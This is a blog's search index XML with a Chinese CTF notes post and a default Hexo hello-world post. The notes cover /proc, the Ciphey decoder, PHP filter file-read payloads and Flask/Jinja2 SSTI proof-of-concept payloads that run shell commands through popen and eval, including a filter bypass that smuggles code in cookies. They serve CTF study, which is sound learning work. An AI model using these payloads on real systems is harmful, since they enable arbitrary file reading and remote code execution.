<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2022/07/29/%E8%AE%B0%E5%BD%95/"/>
      <url>/2022/07/29/%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<div class="story post-story"><h2 id="LINUX-内核"><a href="#LINUX-内核" class="headerlink" title="LINUX 内核"></a>LINUX 内核</h2><p>Linux 内核提供了一种通过 &#x2F;proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。</p><p>proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。</p><p>这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于&#x2F;proc&#x2F;本进程pid&#x2F;。进程可以通过访问&#x2F;proc&#x2F;self&#x2F;目录来获取自己的信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/maps 得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。</span><br><span class="line">/proc/self/mem 是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存.</span><br><span class="line">其中的一些信息</span><br><span class="line">比如/proc/pid/cmdline是进程启动时的命令行、/proc/pid/exe是一个软连接指向了该进程可执行ELF、/proc/pid/cwd是一个软连接指向了进程运行的当前路径等等。</span><br></pre></td></tr></table></figure><p>Linux的进程伪装：将正常的PID指向恶意ELF程序</p><p>1.execve：会在进程ID不变的情况下，将进程内容全部替换、重新装载进程，所以&#x2F;proc&#x2F;self&#x2F;exe也同样被替换了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file=php://filter/read=convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="Ciphey"><a href="#Ciphey" class="headerlink" title="Ciphey"></a>Ciphey</h2><p>Ciphey 是一个使用自然语言处理和人工智能的全自动解密&#x2F;解码&#x2F;破解工具。用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ciphey -t &quot;密文&quot;</span><br><span class="line">ciphey -f 文件名</span><br></pre></td></tr></table></figure><p>安装：</p><p>Python3.7或以上</p><p>Pip（在 Python 3 上）</p><p>使用<code>python3 -m pip install -U ciphey</code>进行安装</p><p>利用<code>ciphey --help</code>来查看帮助</p><p>但是并不是万能的，只能参考一下，有时候会出现误差的甚至不如自己。</p><p><strong>支持破解的密码列表</strong><br>基本加密</p><pre><code>Caesar Cipher-凯撒密码ROT47（使用 ROT47 字母高达 ROT94）ASCII 移位（高达 ROT127，带有完整的 ASCII 字母表）Vigenère Cipher-维吉尼亚密码Affine Cipher-仿射密码Binary Substitution Cipher-二进制替换密码 (XY-Cipher)Baconian Cipher -培根密码（两种变体）SoundexTransposition Cipher-转置密码Pig Latin-猪拉丁语</code></pre><p>现代密码学</p><pre><code>Repeating-key XOR-重复键异或Single XOR-单异或</code></pre><p>编码</p><pre><code>Base2（二进制）Base8（八进制）Base10（十进制）Base16（十六进制）Base32Base58 比特币Base58 Flickr（发布候选阶段）Base58 RippleBase62Base64Base64 URL（发布候选阶段）Base69Base85Z85（发布候选阶段）ASCII Base85Base91Base65536（发布候选阶段）ASCIIReversed text-反转文字Morse Code-摩尔斯电码DNA codons-DNA 密码子（释放候选阶段）AtbashStandard Galactic Alphabet-标准银河字母表（又名 Minecraft Enchanting Language）LeetspeakBaudot ITA2URL encoding-网址编码SMS Multi-tapDMTF（发布候选阶段）A1Z26（发布候选阶段）Prisoner’s Tap Code-囚犯的窃听代码UUencodeBraille-盲文（1 级）</code></pre><p>深奥的语言 (EsoLang)</p><pre><code>Brainfuck-脑残</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">os._wrap_close</span><br><span class="line">warnings.catch_warnings #包含__builtins__模块</span><br><span class="line">subprocess.Popen #进行RCE</span><br></pre></td></tr></table></figure><p>SSTI题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[NCTF 2018]flask真香  NSSCTF </span><br><span class="line">ssti-flask-labs NSSCTF </span><br></pre></td></tr></table></figure><p>ssti-flask-labs NSSCTF </p><blockquote><h5 id="level-1无过滤"><a href="#level-1无过滤" class="headerlink" title="level 1无过滤"></a>level 1无过滤</h5><p>POC<code>&#123;&#123;().__class__.__base__.__subclasses__()[133].__init__.__globals__['popen']('cat /app/flag').read()&#125;&#125;</code></p><p>**level 2过滤<code>&#123;&#123;`**>> POC`&#123;%print(''.__class__.__base__.__subclasses__()[133].__init__.__globals__['popen']('cat /app/flag').read())%&#125;`>> `&#123;%print(x.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /app/flag').read()"))%&#125;`>> >> **level 3盲注**>> **level 4过滤`[]`**>> POC`&#123;&#123;"".__class__.__base__.__subclasses__().pop(133).__init__.__globals__.popen('cat /app/flag').read()&#125;&#125;</code></p><p><strong>level 5过滤<code>单双引号</code></strong></p><p>POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Cookie:x1=__builtins__;x2=__import__(&#x27;os&#x27;).popen(&#x27;cat /app/flag&#x27;).read()</span><br><span class="line"></span><br><span class="line">code=&#123;&#123;x.__init__.__globals__.__getitem__(request.cookies.x1).eval(request.cookies.x2)&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>level 6过滤<code>下划线</code></strong></p><p>POC</p></blockquote></div>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/07/29/hello-world/"/>
      <url>/2022/07/29/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><div class="story post-story"><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p></div>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
